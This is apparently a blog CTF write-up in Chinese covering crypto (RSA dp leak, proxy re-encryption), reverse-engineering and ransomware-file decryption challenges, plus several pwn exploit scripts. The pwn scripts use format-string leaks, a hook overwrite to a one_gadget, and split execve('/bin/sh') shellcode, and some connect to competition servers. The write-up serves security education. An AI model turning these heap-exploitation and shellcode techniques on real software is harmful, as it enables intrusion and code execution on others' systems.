ct=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151 # [58, 53, 122] [145, 124, 244] [5, 19, 192] [255, 23, 64] [57, 113, 194] [246, 205, 162] [112, 87, 95] [215, 147, 105] [16, 131, 38] [234, 36, 46] [68, 61, 146] [148, 61, 9] [139, 77, 32] [96, 56, 160] [121, 76, 17] [114, 246, 92] [178, 206, 60] [168, 147, 26] [168, 41, 68] [24, 93, 84] [175, 43, 88] [147, 97, 153] [42, 94, 45] [150, 103, 127] [68, 163, 62] [165, 37, 89] [219, 248, 59] [241, 182, 8] [140, 211, 146] [88, 226, 2] [48, 150, 56] [87, 109, 255] [227, 216, 65] [23, 190, 10] [5, 25, 64] [6, 12, 124] [53, 113, 124] [255, 192, 158] [61, 239, 5] [62, 108, 86] [123, 44, 64] [195, 192, 30] [30, 82, 95] [56, 178, 165] [68, 77, 239] [106, 247, 226] [17, 46, 114] [91, 71, 156] [157, 43, 182] [146, 6, 42] [148, 143, 161] [108, 33, 139] [139, 169, 157] [71, 140, 25] [28, 153, 26] [241, 221, 235] [28, 131, 141] [159, 111, 184] [47, 206, 11] [220, 152, 157] [41, 213, 97] [4, 220, 10] [77, 13, 248] [94, 140, 110] [25, 250, 226] [218, 102, 109] [189, 238, 66] [91, 18, 131] [23, 239, 190] [159, 33, 72] [183, 78, 208] [209, 213, 101] [111, 50, 220] [166, 104, 233] [170, 144, 10] [187, 87, 175] [195, 59, 104] [165, 179, 179] [99, 247, 153] [195, 61, 100] [223, 159, 165] [230, 93, 184] [87, 28, 35] [35, 122, 38] [158, 188, 163] [229, 192, 222] [12, 12, 192] [207, 95, 224] [127, 113, 137] [22, 114, 143] [13, 45, 144] [70, 140, 211] [57, 101, 42] [132, 62, 129] [40, 128, 124] [1, 132, 161] [164, 33, 133] [252, 201, 32] [8, 18, 247] [1, 88, 55] [201, 135, 186] [101, 254, 125] [236, 196, 39] [148, 24, 103] [101, 29, 253] [97, 156, 64] [90, 103, 91] [50, 48, 80] [206, 22, 93] [11, 114, 174] [61, 132, 247] [215, 32, 232] [95, 128, 90] [57, 35, 228] [163, 143, 107] [178, 250, 28] [64, 107, 225] [106, 115, 207] [85, 134, 21] [118, 201, 76] [234, 34, 22] [241, 236, 122] [111, 185, 127] [1, 26, 164] [254, 57, 117] [243, 27, 32] [161, 88, 80] [50, 165, 93] [87, 182, 216] [184, 159, 63] [167, 166, 123] [37, 78, 33] [186, 81, 58] [48, 3, 239] [70, 186, 13] [56, 108, 178] [54, 55, 235] [105, 180, 105] [16, 194, 98] [136, 11, 41] [18, 203, 79] [185, 114, 170] [148, 181, 223] [118, 57, 160] [23, 250, 181] [235, 219, 228] [44, 151, 38] [185, 224, 134] [42, 162, 122] [3, 9, 158] [129, 245, 2] [66, 241, 92] [80, 124, 36]# [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]# [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579] 算是放了一个签到题，$seed$啥都给了，照着种子还原$rands$再异或还原$d_p$就行，最终已知$d_p,n,e,c$解密，梭就完了，需要注意的是$py2,py3$的$random$不太相同，这里必须使用$py2$。 #py2import randomseeds=[4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]res=[55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]dp=''for i in range(len(seeds)): random.seed(seeds[i]) for j in range(4): x=random.randint(0,255) if j==i%4: xx=x^res[i] print(chr(xx)) dp+=chr(xx)print(dp)#py3import gmpy2from Crypto.Util.number import *def boom_dp(n,e,c,dp): for x in range(1, e): if(e*dp%x==1): p=(e*dp-1)//x+1 assert n%p==0 q=n//p phin=(p-1)*(q-1) d=gmpy2.invert(e, phin) m=pow(c, d, n) print(long_to_bytes(m))N=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391e=65537c=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151dp=5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057boom_dp(N,e,c,dp)#flag{74281db3-c6f0-e59a-4da6-39b8c71250fe} share secret#! /usr/bin/env pythonfrom libnum import n2s, s2nfrom random import getrandbitsfrom hashlib import sha256import SocketServerfrom secret import flagp, g = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3, \\ 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577def h2(m): return int(sha256(m).hexdigest(), 16)def key_gen(nbits): s = getrandbits(nbits) % p while s.bit_length() &lt; nbits - 2: s = getrandbits(nbits) % p pk = pow(g, s, p) return pk, sdef enc(m, pk): m = s2n(m) e, v = getrandbits(256), getrandbits(256) E, V = pow(g, e, p), pow(g, v, p) s = v + e * h2(n2s(E) + n2s(V)) c = m * pow(pk, e + v, p) % p cap = (E, V, s) return c, capdef rk_gen(sk, pki, group=9): x, r = getrandbits(512) % p, getrandbits(512) % p prefix = n2s(pow(g, x * sk, p)).rjust(64, '\\x00') encoder = [1, -pow(pki, x * sk, p) % p] for i in range(1, group + 1): pkj = getrandbits(512) new_encoder = [1] cur = pow(pkj, x * sk, p) for j in range(1, i + 1): new_encoder.append((encoder[j] + (-1) * cur * encoder[j - 1]) % p) new_encoder.append(encoder[i] * cur * (-1) % p) encoder = new_encoder encoder[-1] += r dd = h2(prefix + n2s(r).rjust(64, '\\x00')) | 1 rk = sk * dd return rk, encoder[1:], prefixdef re_enc(rk, cipher): c, (E, V, s) = cipher E_ = pow(E, rk, p) V_ = pow(V, rk, p) s_ = s * rk % p return c, (E_, V_, s_)class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): passclass EncHandler(SocketServer.BaseRequestHandler): def handle(self): self.request.sendall(&quot;Welcome to our netdisk system! Our system store only users' ciphertext\\n&quot;) self.request.sendall(&quot;Now you can choose what you wanna do\\n&quot;) self.request.sendall(&quot;1. generate your key\\n2. start challenge\\n2. get the ciphertext&quot;) pk_of_one_user, sk_of_one_user = key_gen(512) cipher = enc(flag, pk_of_one_user) pk, sk = key_gen(512) while 1: mul = 1 self.request.sendall('Input your choice\\n') self.request.sendall(&quot;choice&gt;&quot;) choice = self.request.recv(16).strip() if choice == '1': self.request.sendall('Please take good care of it!\\n' + hex(pk) + ',' + hex(sk) + '\\n') elif choice == '2': group_list = [32, 64, 128, 256] for group in group_list: m = getrandbits(200) plaintext = n2s(m) cur_cipher = enc(plaintext, pk_of_one_user) rk, encoder, prefix = rk_gen(sk_of_one_user, pk, group=group) mul *= rk mul %= p new_cipher = re_enc(rk, cur_cipher) self.request.sendall('The cipher shared to you\\n' + str(new_cipher) + '\\n') self.request.sendall('prefix, encoder = ' + str((encoder, prefix.encode('hex'))) + '\\n') ans = self.request.recv(1024).strip() if int(ans, 16) != m: exit(1) self.request.sendall('You are a clever boy! Now I can share you some other information!\\n' + hex(mul) + '\\n') elif choice == '3': self.request.sendall(str(cipher) + '\\n') exit(1) else: continueif __name__ == &quot;__main__&quot;: HOST, PORT = &quot;0.0.0.0&quot;, 1213 server = ThreadedTCPServer((HOST, PORT), EncHandler) server.serve_forever() from libnum import n2s, s2nfrom hashlib import sha256from gmpy2 import *from pwn import *def h2(m): return int(sha256(m).hexdigest(), 16)p=remote('47.104.85.225',62351)context.log_level='debug'#1p.recvuntil('choice&gt;')p.sendline('1')p.recvuntil('Please take good care of it!\\n')pk_sk=p.recvuntil('\\n')[:-1].decode()[2:-1].split('L,0x')pk,sk=int(pk_sk[0],16),int(pk_sk[1],16)#2p.recvuntil('choice&gt;')p.sendline('2')pp, g = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3, \\ 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577 group_list = [32, 64, 128, 256]D=1for group in group_list: p.recvuntil('The cipher shared to you\\n') cc=int(p.recvuntil('L, ')[1:-3]) new_cipher=[cc] new_cipher+=eval(p.recvuntil(')\\n')[:-2].decode().replace('L','')) c,E_,V_,s_=new_cipher p.recvuntil('prefix, encoder = ') lateset_encoder,prefix=pre_enc=eval(p.recvuntil('\\n')[:-1].decode().replace('L','')) prefix=int(prefix,16) encoder=[1,(-pow(prefix,sk,pp)) %pp] prefix = n2s(prefix).rjust(64, b'\\x00') ml=[1] for i in range(len(lateset_encoder)): ml.append((ml[-1]*encoder[-1]+lateset_encoder[i]*(-1)**(i+1))%pp) r=-ml[-1]%pp dd = h2(prefix + n2s(r).rjust(64, b'\\x00')) | 1 D*=dd d=invert(dd,pp-1) cccc=E_*V_%pp xx=pow(cccc,d,pp) m=c*invert(xx,pp)%pp p.send(hex(m)[2:])p.recvuntil('You are a clever boy! Now I can share you some other information!\\n0x')mul=int(p.recvuntil('\\n')[:-2],16)print(&quot;*****************************************************&quot;)print(D)print(mul)print(&quot;*****************************************************&quot;)#3p.recvuntil('choice&gt;')p.sendline('3')cc=int(p.recvuntil('L, ')[1:-3])cipher=[cc]cipher+=eval(p.recvuntil(')\\n')[:-2].decode().replace('L',''))print(&quot;*****************************************************&quot;)print(cipher)print(&quot;*****************************************************&quot;)'''from gmpy2 import *p=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3D=mul=c=mul*invert(D,p)%pe=4R.&lt;x&gt; = Zmod(p)[]f = x ^ e- cf = f.monic()res1 = f.roots()print(res1)''''''from Crypto.Util.number import *from gmpy2 import *pp=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3sk=3415391405045794570454819264678842883406589094879440924771251075986414212665514615692960890299627279215019657097231396800926908716766924569917256830117771cipher=[2527933870918239983384943711339580604598094277545525217834226330258419910301299206846573883556622915108773654201000637301174540362470098333217770989148988, 1534944798391033818702709152362158543885444981173771976353948339054898890879750350964082465225558424319599976320653165768478628695969238760863936634123497, 6480111027732079088305364577732332359884279592380152181509453693475437439597161069742983512858501419606525584662299391909461177747617022491590642108315732, 3294517958162409271434180708054007225109922377603959481825421096746414863994421950281118003999380326689412683711381872657890904915131742940967848977783892]c,E,V,s=cipherxx=E*V%ppm=c*invert(pow(xx,sk,pp),pp)%ppprint(long_to_bytes(m))#flag{504d0411-6707-469b-be31-9868200aca95}''' ReverseRev_Dizzy一串简单的数学计算，首先是IDA F5，挺慢的，多等等，如果提示要逆的太大了，就自己百度一下，改一下 给了运算、给了最后比较的值，逆一下就行了，将所有复制出来，只留下运算的部分，然后写个脚本 s = [0x27, 0x3C, 0xE3, 0xFC ,46 ,65 ,7 ,94 ,98 ,-49 ,-24 ,-14 ,-110 ,128 ,-30 ,54 ,-76 ,-78 ,103 ,119 ,15 ,-10 ,13 ,-74 ,-19 ,28 ,101 ,-118 ,7 ,83 ,-90 ,102]f = open('1.txt','r').readlines()for i in range(len(f)): if(i != len(f)-1): f[i] = f[i][:-2] else: f[i] = f[i][:-1]f1 = ['']*len(f)for i in range(len(f)): f1[i] = f[len(f)-1-i]for i in range(len(f1)): tmp = f1[i].replace('byte_43841C', 's') if('+=' in tmp): tmp = tmp.replace('+=','-=') elif('-=' in tmp): tmp = tmp.replace('-=','+=') else: pass exec(tmp)for i in range(len(s)): print(chr(s[i]%256),end='') flag{Try_R3vers1ng_W1th_ScR!pt!} 勒索病毒用生成文件的修改时间为时间戳。 查阅官方文档发现，0x800c是sha256，加密方式为0x660E,此为iv为零向量。 import hashlibfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad,padkey=bytearray([ 0xB2, 0x2F, 0xC6, 0x0E, 0x4F, 0xD4, 0x54, 0x4B, 0x05, 0x11, 0x1A, 0x61, 0x21, 0xE7, 0xB1, 0x8E])key=hashlib.sha256(key).hexdigest()key=bytes.fromhex(key)[:16]iv=b'\\x00'*16f1=open(&quot;flag.bmp.ctf_crypter&quot;,&quot;rb&quot;)f2=open(&quot;flag.bmp&quot;,&quot;wb&quot;)data=f1.read()ae=AES.new(key,AES.MODE_CBC,iv)f2.write(ae.decrypt(pad(data,16)))f1.close()f2.close() PWN队友真强，完全被带飞，做了俩pwn，还有俩pwn卡到一个点上，摸啦|pwn👴👴带我飞，才发现我好菜 note思路：自己构建格式化字符串漏洞，这里泄露打IO_STDOUT，然后再打realloc_hook为onegadget，需要抬栈，卡在抬栈这个地方啦，然后直接rceexp： #coding:utf-8from pwn import *context.log_level = &quot;debug&quot;p = process(&quot;./note&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)#libc=ELF('/home/roo/桌面/glibc-all-in-one-master/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/libc.so.6')#p = remote(&quot;47.104.70.90&quot;,25315)elf = ELF(&quot;./note&quot;)def add(size,content): p.recvuntil(&quot;choice: &quot;) p.sendline(&quot;1&quot;) p.sendlineafter(&quot;size: &quot;,str(size)) p.sendlineafter(&quot;content: &quot;,content) p.recvuntil(&quot;addr: &quot;) #heap_addr = int(p.recv(6).ljust(8,&quot;\\x00&quot;))def show(): p.recvuntil(&quot;choice: &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;content:&quot;) content = p.recv() gdb.attach(p,'$rebase 0x1235')p.recvuntil(&quot;choice: &quot;) p.sendline(&quot;2&quot;)p.recvuntil(&quot;say ? &quot;)p.sendline(&quot;%7$s\\x00&quot;)payload = p64(0xfbad1800) + p64(0)*3p.sendline(payload)raw_input()libc_base = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;)) -0x3c36e0malloc_hook = libc_base + libc.sym[&quot;__malloc_hook&quot;]success(&quot;libc_base:&quot;+hex(libc_base))success(&quot;malloc_hook:&quot;+hex(malloc_hook))rce =0x4527a + libc_baserealloc = libc_base + libc.sym[&quot;realloc&quot;] realloc_hook = libc_base + libc.sym[&quot;__realloc_hook&quot;]payload = &quot;%7$s\\x00\\x00\\x00\\x00&quot;+p64(realloc_hook)p.recvuntil(&quot;choice: &quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;say ? &quot;)p.sendline(payload)raw_input()#gdb.attach(p)payload = p64(rce) + p64(realloc+6)p.recvuntil(&quot;? &quot;)p.sendline(payload)p.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)p.sendlineafter(&quot;size:&quot;,&quot;2&quot;)p.interactive() JigSaw’sCage额哈，前面有长整型溢出，这个题是写shellcode的一道题，test有执行权限，难点就是只能写入0x10大小的内容，shellcode不可能只有0x10，难点考验shellcode，分chunk写入，然后再test一下即可exp： from pwn import *context.log_level = 'debug'p = process('./JigSAW')context.arch = &quot;amd64&quot;def add(idx): p.sendlineafter(&quot;Choice :&quot;, &quot;1&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx))def show(idx): p.sendlineafter(&quot;Choice :&quot;, &quot;5&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx))def edit(idx, content): p.sendlineafter(&quot;Choice :&quot;, &quot;2&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx)) p.sendafter(&quot;iNput:&quot;, content)def free(idx): p.sendlineafter(&quot;Choice :&quot;, &quot;3&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx))def test(idx): p.sendlineafter(&quot;Choice :&quot;, &quot;4&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx))s1 = asm(&quot;mov rsp, rdx\\nadd rsp, 0x20\\npush rsp&quot;)s2 = asm(&quot;mov rax, 0x68732f6e69622f\\nadd rsp, 0x20\\npush rsp&quot;)s3 = asm(&quot;push rax\\nmov rdi, rsp\\nxor rsi, rsi\\nadd rsp, 0x28\\npush rsp&quot;)s4 = asm(&quot;xor rdx, rdx\\nmov rax, 59\\nsyscall\\n&quot;)p.sendlineafter(&quot;Name:&quot;, &quot;max&quot;)p.sendlineafter(&quot;Choice:&quot;, str(0xffffffff+1)) #int len overlapadd(0)add(1)add(2)add(3)edit(0,s1)edit(1, s2)edit(2, s3)edit(3, s4)test(0)p.interactive() PassWordBox_FreeVersion额哈，这道题，卡在了加密这东西的地方，后来发现可以泄露固定值，然后再进行异或就可以得到明文，想要写入明文，二次异或即可，有off-by-one，可以造overlap，直接打freehook为onegdaget即可，（这道题是赛后出来的）exp： #coding:utf8from pwn import *sh = process('./pwdFree')#sh = remote('47.104.71.220',38562)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(index,size,content): sh.sendlineafter('Choice:','1') sh.sendlineafter('Save:',str(index)) sh.sendlineafter('Pwd:',str(size)) sh.sendafter('Pwd:',content)def edit(index,content): sh.sendlineafter('Choice:','2') sh.sendline(str(index)) sleep(0.5) sh.send(content)def show(index): sh.sendlineafter('Choice:','3') sh.sendlineafter('Check:',str(index))def delete(index): sh.sendlineafter('Choice:','4') sh.sendlineafter('Delete:',str(index))add(0,1,'\\x00')sh.recvuntil('Save ID:')random = u64(sh.recv(8))print 'cookie=',hex(random)add(1,0xF0,'a'*0xF0) #1add(2,0x80,'b'*0x80) #2add(3,0x80,'c'*0x80) #3add(4,0xF0,'d'*0xF0) #4for i in range(5,12): add(i,0xF0,'aaaa'*0xd0)for i in range(5,12): delete(i)delete(3)add(3,0x88,'b'*0x80 + p64((0x100 + 0x90 + 0x90) ^ random) + '\\x00')delete(1)delete(4)for i in range(5,12): add(i,0xF0,'a'*0xf0)add(1,0xF0,'a'*0xF0) #1show(2)sh.recvuntil('Pwd is: ')libc_base = (u64(sh.recv(8)) ^ random) - 0x3ebca0system_addr = libc_base + libc.sym['system']free_hook_addr = libc_base + libc.sym['__free_hook']'''0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints: rsp &amp; 0xf == 0 rcx == NULL0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL '''onegdaget=0x4f432delete(3)add(3,0x98,'b'*0x80 + (p64(0 ^ random) + p64(0x91 ^ random) + p64(free_hook_addr ^ random)))add(20,0x80,p64(0) + 'c'*0x78)add(21,0x80,p64(onegdaget ^ random) + 'd'*0x78)delete(11)sh.interactive() 总结：队友带我飞，lemmon那道题也不难，是SROP ，doublfree 劫持tc。修改fd指向unsortedbin切割下来的chunk，可以劫持freehook为setcontet，然后srop，出来flag，我没做，思路是这","link":"/posts/62454/"}],"tags":[{"name":"WP","slug":"WP","link":"/tags/WP/"}],"categories":[]}